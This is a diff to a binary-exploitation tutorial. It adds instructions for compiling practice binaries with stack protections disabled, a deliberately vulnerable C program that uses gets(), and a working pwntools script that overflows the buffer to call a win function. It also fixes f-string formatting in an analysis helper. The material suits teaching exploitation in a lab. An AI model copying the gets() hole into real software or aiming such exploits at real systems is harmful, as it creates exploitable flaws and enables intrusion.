@@ -121,6 +121,50 @@ DEFAULT_OS="linux"
 
 ---
 
+## Compiling C Programs for Practice
+
+A crucial part of learning binary exploitation is having binaries to practice on. Compiling your own simple, vulnerable programs is the best way to start. This allows you to understand the connection between source code and the resulting assembly, and to control the security protections in place.
+
+We'll use `gcc` (the GNU Compiler Collection), which should be installed with `build-essential` or is available on most Linux systems.
+
+### Basic Compilation
+
+Here's a simple "Hello, World!" program (`hello.c`):
+
+```c
+// File: hello.c
+#include <stdio.h>
+
+int main() {
+    printf("Hello, World!\n");
+    return 0;
+}
+```
+
+To compile it, use the following command:
+
+```bash
+gcc -o hello hello.c
+```
+
+This creates an executable file named `hello`.
+
+### Compiling for Exploitation Practice
+
+Modern compilers enable security protections by default. For learning basic buffer overflows, it's helpful to disable them.
+
+```bash
+# Compile a 64-bit binary with protections disabled
+gcc -m64 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
+```
+
+- **`-fno-stack-protector`**: Disables stack canaries, which are designed to detect stack buffer overflows.
+- **`-z execstack`**: Makes the stack executable. This is necessary for shellcode injection but is good practice to include even for ROP.
+- **`-no-pie`**: Disables Position-Independent Executable. This ensures the binary's code is loaded at a fixed address, making it easier to predict function and gadget addresses without needing an information leak.
+- **`-m64`**: Explicitly compile for a 64-bit architecture.
+
+---
+
 ## Essential Tools Overview
 
 ### 1. File Analysis Tools
@@ -799,6 +843,96 @@ def exploit_with_shellcode(binary_path, offset, return_address):
 ```
 
 *[Screenshot placeholder: Successful shellcode execution showing shell prompt]*
+
+---
+
+## Putting It All Together: A Full Walkthrough
+
+Let's walk through a complete example, from writing a vulnerable program to exploiting it. This exercise combines everything we've learned so far.
+
+### Step 1: The Vulnerable Program
+
+Save the following code as `vulnerable.c`. It contains a classic stack buffer overflow vulnerability in the `vulnerable_function` and a `win` function that we want to execute.
+
+```c
+// File: vulnerable.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void win() {
+    printf("Congratulations! You've successfully exploited the buffer overflow!\n");
+    printf("Here is your flag: flag{b4s1c_buff3r_0v3rfl0w_w1n}\n");
+    fflush(stdout);
+}
+
+void vulnerable_function() {
+    char buffer[40];
+    printf("Enter your name: ");
+    fflush(stdout);
+    gets(buffer); // Vulnerable function! No bounds checking.
+    printf("Hello, %s\n", buffer);
+    fflush(stdout);
+}
+
+int main() {
+    vulnerable_function();
+    return 0;
+}
+```
+
+### Step 2: Compile the Binary
+
+Now, compile it with the security protections disabled so we can perform a simple "return-to-function" exploit.
+
+```bash
+gcc -fno-stack-protector -no-pie -o vulnerable vulnerable.c
+```
+
+### Step 3: Analyze and Write the Exploit
+
+Our goal is to overflow the `buffer` in `vulnerable_function` and overwrite the return address on the stack with the address of the `win` function.
+
+1.  **Find the offset**: We need to know how many bytes to send to fill the buffer and reach the return address. The buffer is 40 bytes. On x86-64, we also need to overwrite the 8-byte saved base pointer (RBP) before we get to the return address. So, the offset is `40 (buffer) + 8 (RBP) = 48` bytes.
+2.  **Find the target address**: We need the address of the `win` function. We can use `pwntools` to find this automatically.
+
+Here is the complete exploit script. Save it as `exploit.py`.
+
+```python
+# File: exploit.py
+from pwn import *
+
+# --- Configuration ---
+binary_path = "./vulnerable"
+context.binary = binary_path
+context.log_level = 'info'
+
+# --- Analysis ---
+# The buffer is 40 bytes. On x86-64, we add 8 bytes to overwrite RBP.
+offset = 48
+
+# Use pwntools to find the address of the 'win' function
+elf = ELF(binary_path)
+win_address = elf.symbols['win']
+log.info(f"Calculated offset: {offset}")
+log.info(f"Address of 'win' function: {hex(win_address)}")
+
+# --- Exploitation ---
+p = process(binary_path)
+payload = b'A' * offset + p64(win_address)
+p.sendlineafter(b"Enter your name: ", payload)
+print(p.recvall().decode())
+```
+
+### Step 4: Run the Exploit
+
+Make the script executable (`chmod +x exploit.py`) and run it.
+
+```bash
+python3 exploit.py
+```
+
+You should see the "Congratulations!" message and the flag printed to your terminal, confirming your exploit was successful!
 
 ---
 
@@ -1953,16 +2087,16 @@ def initial_analysis():
     elf = ELF(BINARY_PATH)
     
     # Basic information
-    log.info(f"Architecture: {{elf.arch}}")
-    log.info(f"Bits: {{elf.bits}}")
-    log.info(f"Endianness: {{elf.endian}}")
+    log.info(f"Architecture: {elf.arch}")
+    log.info(f"Bits: {elf.bits}")
+    log.info(f"Endianness: {elf.endian}")
     
     # Security protections
     log.info("Security protections:")
-    log.info(f"  NX: {{elf.nx}}")
-    log.info(f"  PIE: {{elf.pie}}")
-    log.info(f"  Canary: {{elf.canary}}")
-    log.info(f"  RELRO: {{elf.relro}}")
+    log.info(f"  NX: {elf.nx}")
+    log.info(f"  PIE: {elf.pie}")
+    log.info(f"  Canary: {elf.canary}")
+    log.info(f"  RELRO: {elf.relro}")
     
     # Functions
     log.info("Available functions:")
@@ -1980,7 +2114,7 @@ def static_analysis():
                           capture_output=True, text=True)
     
     interesting_strings = []
-    for line in result.stdout.split('\\n'):
+    for line in result.stdout.splitlines():
         if any(keyword in line.lower() for keyword in 
                ['flag', 'password', 'secret', 'admin', 'root']):
             interesting_strings.append(line)
@@ -1988,7 +2122,7 @@ def static_analysis():
     if interesting_strings:
         log.success("Interesting strings found:")
         for s in interesting_strings:
-            log.info(f"  {{s}}")
+            log.info(f"  {s}")
     
 def dynamic_analysis():
     """Perform dynamic analysis"""
@@ -2001,10 +2135,10 @@ def dynamic_analysis():
         response = p.recv(timeout=2)
         p.close()
         
-        log.info(f"Basic execution response: {{response}}")
+        log.info(f"Basic execution response: {response}")
         
     except Exception as e:
-        log.error(f"Error during basic execution: {{e}}")
+        log.error(f"Error during basic execution: {e}")
 
 if __name__ == "__main__":
     log.info(f"Analyzing {{BINARY_PATH}}")
